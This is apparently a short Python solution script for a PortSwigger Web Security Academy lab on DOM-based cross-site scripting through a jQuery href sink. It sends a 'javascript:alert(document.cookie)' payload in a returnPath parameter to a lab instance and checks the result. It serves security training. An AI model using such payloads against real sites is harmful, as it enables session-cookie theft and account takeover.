#https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

from utils import *

payload="feedback?returnPath=javascript:alert(document.cookie)"
url="https://0a4b009a04ecdf3f82a13eee00bd00cd.web-security-academy.net/"+payload
response=requests.get(url)

print(check_succes(parse_html(response)))